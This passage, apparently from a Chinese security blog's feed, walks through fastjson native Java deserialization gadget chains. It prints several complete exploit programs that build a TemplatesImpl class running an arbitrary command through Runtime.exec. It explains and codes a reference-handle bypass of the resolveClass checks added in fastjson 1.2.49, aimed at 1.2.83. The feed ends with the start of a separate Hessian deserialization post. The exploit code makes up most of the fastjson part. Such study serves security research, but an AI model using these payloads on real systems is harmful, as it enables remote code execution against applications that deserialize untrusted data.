class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111336619.png" alt="image-20241011133609518"></p><p>fastjson2利用</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson2.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson2</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(val);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111341193.png" alt="image-20241011134159108"></p><p>JSONObject的利用也一样，就不再写一遍了</p><h1 id="为什么fastjson1249以后不再能利用"><a href="#为什么fastjson1-2-49以后不再能利用" class="headerlink" title="为什么fastjson1.2.49以后不再能利用"></a>为什么fastjson1.2.49以后不再能利用</h1><p>因为从1.2.49开始，JSONArray以及JSONObject方法开始有了自己的readObject方法</p><p><img src="https://cdn.clown2024.cn/202410111346927.png" alt="image-20241011134629872"></p><p>在其<code>SecureObjectInputStream</code>类当中重写了<code>resolveClass</code>,在其中调用了<code>checkAutoType</code>方法做类的检查</p><p><img src="https://cdn.clown2024.cn/202410111350600.png" alt="image-20241011135009543"></p><p>所以后面就是我们如何进行绕过的问题了</p><h1 id="fastjson1249后绕过"><a href="#fastjson1-2-49后绕过" class="headerlink" title="fastjson1.2.49后绕过"></a>fastjson1.2.49后绕过</h1><p>他检查的逻辑是这样的，当调用JSONArray&#x2F;JSONObject的Object方法触发反序列化时，将这个反序列化过程委托给<code>SecureObjectInputStream</code>处理时，触发resolveClass实现对恶意类的拦截</p><p>看起来很正常，但实际上他的反序列化的逻辑是不安全，他是不安全的ObjectInputStream套个安全的SecureObjectInputStream导致了绕过</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">ObjectInputStream -&gt; readObject<br>xxxxxx(省略中间过程)<br>SecureObjectInputStream -&gt; readObject -&gt; resolveClass<br></code></pre></td></tr></table></figure><p><strong>安全的反序列化写法</strong></p><p>我们正常的安全反序列化写法应该是这样的，生成一个继承ObjectInputStream的类并重写resolveClass(假定为TestInputStream)，由它来做反序列化的入口，这样才是安全的</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TestInputStream -&gt; readObject -&gt; resolveClass<br></code></pre></td></tr></table></figure><p><strong>如何绕过</strong></p><p>那我们的绕过思路就是如果在中间的空档期做一些手脚，让他不进入到resolveClass里面</p><p>关键在ObjectInputStream#readObject0里面，我们看一下</p><p><img src="https://cdn.clown2024.cn/202410111558059.png" alt="image-20241011155830987"></p><p>他会根据读到的bytes中tc的数据类型做不同的处理去恢复部分对象</p><p>在不同的case中，大部分类都会最终调用<code>readClassDesc</code>去获取类的描述符，在这个过程中如果当前反序列化数据下一位仍然是<code>TC_CLASSDESC</code>那么就会在<code>readNonProxyDesc</code>中触发<code>resolveClass</code></p><p><img src="https://cdn.clown2024.cn/202410111611096.png" alt="image-20241011161140045"></p><p><img src="https://cdn.clown2024.cn/202410111611784.png" alt="image-20241011161152724"></p><p>然后分支中，不会调用<code>readClassDesc</code>的分支有<code>TC_NULL</code>、<code>TC_REFERENCE</code>、<code>TC_STRING</code>、<code>TC_LONGSTRING</code>、<code>TC_EXCEPTION</code>，string与null这种对我们毫无用处的，exception类型则是解决序列化终止相关也没什么用，那么就只剩下Reference引用类型了。</p><h2 id="引用类型利用"><a href="#引用类型利用" class="headerlink" title="引用类型利用"></a>引用类型利用</h2><p>我们需要在JSONArray&#x2F;JSONObject对象反序列化恢复对象时，让我们的恶意类成为引用类型从而绕过resolveClass的检查</p><p>方法就是向List、set、map类型中添加同样对象时即可成功利用</p><p><strong>原理分析</strong></p><p>分析代码：</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>我们写入对象的时候会走到writeObject0这个方法</p><p><img src="https://cdn.clown2024.cn/202410111631619.png" alt="image-20241011163106557"></p><p>这里的注释翻译一下就是处理以前写入且不可替换的对象</p><p>然后走到ArrayList#writeObject</p><p><img src="https://cdn.clown2024.cn/202410111641589.png" alt="image-20241011164111537"></p><p>然后跟进去</p><p><img src="https://cdn.clown2024.cn/202410111641984.png" alt="image-20241011164143924"></p><p>这次传的是TemplatesImpl类，我们第一次写的时候他会在handles哈希表中建立映射</p><p>当我们再次写入的时候，他在查询的时候就不会返回-1</p><p><img src="https://cdn.clown2024.cn/202410111646059.png" alt="image-20241011164654999"></p><p>然后就可以进入到writeHandle方法里面</p><p><img src="https://cdn.clown2024.cn/202410111647745.png" alt="image-20241011164743700"></p><p>可以看到他将重复对象以引用类型写入，这样我们就可以绕过resolveClass的检查了</p><h2 id="利用链构造"><a href="#利用链构造-1" class="headerlink" title="利用链构造"></a>利用链构造</h2><p>文章的简单利用代码思路</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">TemplatesImpl templates = TemplatesImplUtil.getEvilClass(&quot;clac&quot;);<br>ArrayList&lt;Object&gt; arrayList = new ArrayList&lt;&gt;();<br>arrayList.add(templates);<br><br>JSONArray jsonArray = new JSONArray();<br>jsonArray.add(templates);<br><br>BadAttributeValueExpException bd = getBadAttributeValueExpException(jsonArray);<br>arrayList.add(bd);<br>  <br>WriteObjects(arrayList);<br></code></pre></td></tr></table></figure><p>文章的思路解释：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><code class="hljs plaintext">序列化时，在这里templates先加入到arrayList中，后面在JSONArray中再次序列化TemplatesImpl时，由于在handles这个hash表中查到了映射，后续则会以引用形式输出<br><br>反序列化时ArrayList先通过readObject恢复TemplatesImpl对象，之后恢复BadAttributeValueExpException对象，在恢复过程中，由于BadAttributeValueExpException要恢复val对应的JSONArray/JSONObject对象，会触发JSONArray/JSONObject的readObject方法，将这个过程委托给SecureObjectInputStream，在恢复JSONArray/JSONObject中的TemplatesImpl对象时，由于此时的第二个TemplatesImpl对象是引用类型，通过readHandle恢复对象的途中不会触发resolveClass，由此实现了绕过<br><br>Set、Map类型也是这样的绕过<br></code></pre></td></tr></table></figure><p>现在就可以写exp了，改成fastjson1.2.83版本来打</p><p>ArrayList的版本</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.ByteArrayInputStream;<br><span class="hljs-keyword">import</span> java.io.ByteArrayOutputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectInputStream;<br><span class="hljs-keyword">import</span> java.io.ObjectOutputStream;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.ArrayList;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-comment">//生成恶意类</span><br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;calc\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        <span class="hljs-type">byte</span>[][] bytes = <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;clazz.toBytecode()&#125;;<br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, bytes);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;clown&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        ArrayList&lt;Object&gt; arrayList=<span class="hljs-keyword">new</span> <span class="hljs-title class_">ArrayList</span>&lt;&gt;();<br>        arrayList.add(templates);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">val</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">valfield</span> <span class="hljs-operator">=</span> val.getClass().getDeclaredField(<span class="hljs-string">&quot;val&quot;</span>);<br>        valfield.setAccessible(<span class="hljs-literal">true</span>);<br>        valfield.set(val, jsonArray);<br><br>        arrayList.add(val);<br><br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">barr</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(barr);<br>        objectOutputStream.writeObject(arrayList);<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">ois</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(barr.toByteArray()));<br>        <span class="hljs-type">Object</span> <span class="hljs-variable">o</span> <span class="hljs-operator">=</span> (Object)ois.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://cdn.clown2024.cn/202410111703825.png" alt="image-20241011170336723"></p><blockquote><p>这里一开始我自己写直接简单粗暴arraylist加了两次，然后把arraylist放JSONArray里，导致打不通，后来一想都放里面的话有一个会不是引用类型，导致他经过resolveClass之后会提前抛出异常，所以我们无论是List还是Map，都是要包裹在外面的，使其第一个类反序列化的时候不经过resolveClass</p></blockquote><p>文章的HashMap的版本</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.Own;<br><br><span class="hljs-keyword">import</span> com.alibaba.fastjson.JSONArray;<br><span class="hljs-keyword">import</span> javax.management.BadAttributeValueExpException;<br><span class="hljs-keyword">import</span> java.io.*;<br><span class="hljs-keyword">import</span> java.lang.reflect.Field;<br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet;<br><span class="hljs-keyword">import</span> javassist.ClassPool;<br><span class="hljs-keyword">import</span> javassist.CtClass;<br><span class="hljs-keyword">import</span> javassist.CtConstructor;<br><span class="hljs-keyword">import</span> com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl;<br><br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> <span class="hljs-title class_">fastjson1Usual1</span> &#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">setValue</span><span class="hljs-params">(Object obj, String name, Object value)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">Field</span> <span class="hljs-variable">field</span> <span class="hljs-operator">=</span> obj.getClass().getDeclaredField(name);<br>        field.setAccessible(<span class="hljs-literal">true</span>);<br>        field.set(obj, value);<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-type">byte</span>[] genPayload(String cmd) <span class="hljs-keyword">throws</span> Exception&#123;<br>        <span class="hljs-type">ClassPool</span> <span class="hljs-variable">pool</span> <span class="hljs-operator">=</span> ClassPool.getDefault();<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">clazz</span> <span class="hljs-operator">=</span> pool.makeClass(<span class="hljs-string">&quot;a&quot;</span>);<br>        <span class="hljs-type">CtClass</span> <span class="hljs-variable">superClass</span> <span class="hljs-operator">=</span> pool.get(AbstractTranslet.class.getName());<br>        clazz.setSuperclass(superClass);<br>        <span class="hljs-type">CtConstructor</span> <span class="hljs-variable">constructor</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">CtConstructor</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">CtClass</span>[]&#123;&#125;, clazz);<br>        constructor.setBody(<span class="hljs-string">&quot;Runtime.getRuntime().exec(\&quot;&quot;</span>+cmd+<span class="hljs-string">&quot;\&quot;);&quot;</span>);<br>        clazz.addConstructor(constructor);<br>        clazz.getClassFile().setMajorVersion(<span class="hljs-number">49</span>);<br>        <span class="hljs-keyword">return</span> clazz.toBytecode();<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-keyword">static</span> <span class="hljs-keyword">void</span> <span class="hljs-title function_">main</span><span class="hljs-params">(String[] args)</span> <span class="hljs-keyword">throws</span> Exception&#123;<br><br><br>        <span class="hljs-type">TemplatesImpl</span> <span class="hljs-variable">templates</span> <span class="hljs-operator">=</span> TemplatesImpl.class.newInstance();<br>        setValue(templates, <span class="hljs-string">&quot;_bytecodes&quot;</span>, <span class="hljs-keyword">new</span> <span class="hljs-title class_">byte</span>[][]&#123;genPayload(<span class="hljs-string">&quot;calc&quot;</span>)&#125;);<br>        setValue(templates, <span class="hljs-string">&quot;_name&quot;</span>, <span class="hljs-string">&quot;1&quot;</span>);<br>        setValue(templates, <span class="hljs-string">&quot;_tfactory&quot;</span>, <span class="hljs-literal">null</span>);<br><br>        <span class="hljs-type">JSONArray</span> <span class="hljs-variable">jsonArray</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">JSONArray</span>();<br>        jsonArray.add(templates);<br><br>        <span class="hljs-type">BadAttributeValueExpException</span> <span class="hljs-variable">bd</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">BadAttributeValueExpException</span>(<span class="hljs-literal">null</span>);<br>        setValue(bd,<span class="hljs-string">&quot;val&quot;</span>,jsonArray);<br><br>        <span class="hljs-type">HashMap</span> <span class="hljs-variable">hashMap</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">HashMap</span>();<br>        hashMap.put(templates,bd);<br>        <span class="hljs-type">ByteArrayOutputStream</span> <span class="hljs-variable">byteArrayOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayOutputStream</span>();<br>        <span class="hljs-type">ObjectOutputStream</span> <span class="hljs-variable">objectOutputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectOutputStream</span>(byteArrayOutputStream);<br>        objectOutputStream.writeObject(hashMap);<br>        objectOutputStream.close();<br><br>        <span class="hljs-type">ObjectInputStream</span> <span class="hljs-variable">objectInputStream</span> <span class="hljs-operator">=</span> <span class="hljs-keyword">new</span> <span class="hljs-title class_">ObjectInputStream</span>(<span class="hljs-keyword">new</span> <span class="hljs-title class_">ByteArrayInputStream</span>(byteArrayOutputStream.toByteArray()));<br>        objectInputStream.readObject();<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure>]]></content>
    
    
      
      
    <summary type="html">&lt;p&gt;看了fastjson的各版本链子，再看一下fastjson的原生反序列化，看的是y4师傅的两篇文章&lt;/p&gt;
&lt;p&gt;&lt;a href=&quot;https://y4tacker.github.io/2023/03/20/year/2023/3/FastJson%E4%B8%8E%E5%</summary>
      
    
    
    
    <category term="java" scheme="https://clowsman.github.io/categories/java/"/>
    
    
    <category term="java" scheme="https://clowsman.github.io/tags/java/"/>
    
    <category term="反序列化" scheme="https://clowsman.github.io/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    
  </entry>
  
  <entry>
    <title>Hessian反序列化</title>
    <link href="https://clowsman.github.io/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <id>https://clowsman.github.io/2024/10/08/Hessian%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</id>
    <published>2024-10-08T09:21:49.000Z</published>
    <updated>2024-10-10T14:57:50.438Z</updated>
    
    <content type="html"><![CDATA[<p>来学一下Hessian反序列化，主要参考su18师傅的文章：</p><h1 id="hessian简介"><a href="#Hessian简介" class="headerlink" title="Hessian简介"></a>Hessian简介</h1><p>直接抄su18师傅里面的</p><p>Hessian 是 <a href="https://caucho.com/">caucho</a> 公司的工程项目，为了达到或超过 ORMI&#x2F;Java JNI 等其他跨语言&#x2F;平台调用的能力设计而出，在 2004 点发布 1.0 规范，一般称之为 Hessian ，并逐步迭代，在 Hassian jar 3.2.0 之后，采用了新的 2.0 版本的协议，一般称之为 Hessian 2.0。</p><p>这是一种动态类型的<a href="http://hessian.caucho.com/doc/hessian-serialization.html">二进制序列化</a>和 <a href="http://hessian.caucho.com/doc/hessian-ws.html">Web 服务</a>协议，专为面向对象的传输而设计。Hessian 协议在设计时，重点的几个目标包括了：必须尽可能的快、必须尽可能紧凑、跨语言、不需要外部模式或接口定义等等。</p><p>对于这样的设计，caucho 公司其实提供了两种解决方案，一个是 Hessian，一个是 Burlap。Hession 是基于二进制的实现，传输数据更小更快，而 Burlap 的消息是 XML 的，有更好的可读性。两种数据都是基于 HTTP 协议传输。</p><p>Hessian 本身作为 <a href="https://caucho.com/products/resin">Resin</a> 的一部分，但是它的 <code>com.caucho.hessian.client</code> 和 <code>com.caucho.hessian.server</code> 包不依赖于任何其他的 Resin 类，因此它也可以使用任何容器如 Tomcat 中，也可以使用在 EJB 中。事实上很多通讯框架都使用或支持了这个规范来序列化及反序列化类。</p><p>作为一个二进制的序列化协议，Hessian 自行定义了一套自己的储存和还原数据的机制。对 8 种基础数据类型、3 种递归类型、ref 引用以及 Hessian 2.0 中的内部引用映射进行了相关定义。这样的设计使得 Hassian 可以进行跨语言跨平台的调用。</p><p>有关Hessian协议和其他协议的对比以及反序列化原理可以看这篇文章：<a href="https://blog.csdn.net/ByteDanceTech/article/details/126188189">https://blog.csdn.net/ByteDanceTech/article/details/126188189</a></p><h1 id="简单使用"><a href="#简单使用" class="headerlink" title="简单使用"></a>简单使用</h1><p>su18师傅的文章里面提供了多种使用方式，这里来复刻一下</p><h2 id="基于servlet"><a href="#基于Servlet" class="headerlink" title="基于Servlet"></a>基于Servlet</h2><p>定义一个方法接口</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">interface</span> <span class="hljs-title class_">Greeting</span> &#123;<br>    String <span class="hljs-title function_">sayHello</span><span class="hljs-params">(HashMap o)</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>服务端创建该方法的具体实现，并继承com.caucho.hessian.server.HessianServlet来将其标记为一个提供服务的Servlet</p><figure class="highlight java"><table><tr><td class="code"><pre><code class="hljs java"><span class="hljs-keyword">package</span> org.clown.hessianservlet;<br><br><span class="hljs-keyword">import</span> com.caucho.hessian.server.HessianServlet;<br><br><span class="hljs-keyword">import</span> java.util.HashMap;<br><span class="hljs-keyword">import</span> javax.servlet.annotation.*;<br><br><span class="hljs-meta">@WebServlet(name = &quot;hessian&quot;, value = &quot;/hessian&quot;)</span><br><span class="hljs-keyword">public</span> <span class="hljs-keyword">class</span> 